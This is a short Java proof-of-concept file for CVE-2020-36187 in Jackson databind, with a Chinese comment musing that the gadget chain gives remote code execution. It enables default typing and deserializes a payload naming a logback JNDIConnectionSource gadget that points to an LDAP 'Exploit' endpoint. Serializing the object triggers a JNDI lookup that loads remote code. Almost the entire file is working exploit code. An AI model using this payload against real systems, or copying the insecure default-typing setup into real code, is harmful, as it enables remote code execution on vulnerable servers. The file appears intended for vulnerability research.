package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class CVE_2020_36187 {
    /**
     * get方法触发.....好像一个链子就是一个rce?
     * @param args
     * @throws IOException
     * @throws IOException
     */
    public static void main(String[] args) throws IOException, IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:1088/Exploit\"}]";
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }
}
